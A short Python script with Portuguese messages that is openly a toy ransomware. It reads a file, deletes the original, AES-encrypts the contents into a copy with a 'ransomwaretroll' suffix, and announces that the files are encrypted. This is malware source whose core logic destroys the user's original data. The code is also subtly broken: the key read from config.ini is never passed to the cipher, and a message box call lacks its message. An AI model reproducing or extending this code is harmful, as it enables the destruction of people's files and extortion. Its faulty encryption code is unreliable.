import os
import pyaes
from tkinter import messagebox
from configparser import ConfigParser

def catch_Key():
    config = ConfigParser()
    config.read('config.ini')
    return config.get('configurações','chave_criptografia')

file_name = "teste.txt"

try:
    with open(file_name, "rb") as file:
        file_data = file.read()

    os.remove(file_name)

    Chave = catch_Key()
    aes = pyaes.AESModeOfOperationCTR()

    crypto_data = aes.encrypt(file_data)

    new_file_name = file_name + "ransomwaretroll"
    with open(new_file_name, 'wb') as new_file:
        new_file.write(crypto_data)

    messagebox.showinfo("Arquivos criptografados com sucessos")

except Exception as e:
    messagebox.showerror("Erro", f"Ocorreu um erro: {str(e)}")
